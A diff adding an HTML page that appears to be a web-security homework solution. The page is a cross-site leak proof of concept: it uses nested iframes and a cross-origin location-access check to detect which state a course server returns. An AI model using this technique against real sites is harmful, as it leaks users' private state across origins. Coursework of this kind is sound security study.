@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"></head><body>
+    <button onclick="checkA()">Check A</button>
+    <button onclick="checkB()">Check B</button>
+    <script>
+        function checkA() {
+            leak('https://hw06.websec.cs.uni-paderborn.de/a3?state=A')
+        }
+        function checkB() {
+            leak('https://hw06.websec.cs.uni-paderborn.de/a3?state=B')
+        }
+        const leak = async (url) => {
+            return new Promise(r => {
+                let iframe = document.createElement('iframe')
+
+                window.onmessage = (e) => {
+                    iframe.remove()
+                    let div = document.createElement('div')
+                    div.innerText = e.data
+                    document.body.appendChild(div)
+                    return r(e.data)
+                }
+
+                iframe.srcdoc = `
+                    <iframe id="frame" src="${url}"></iframe>
+                    <script>
+                        window.onload = () => {
+                            try{
+                                // is it about:blank?
+                                frame.contentWindow.location.href
+                                parent.postMessage(1,'*');
+                            }catch(e){
+                                parent.postMessage(0,'*');
+                            }
+                        }
+                    <\/script>`
+                document.body.appendChild(iframe)
+            })
+        }
+    </script>
+
+
+</body></html>
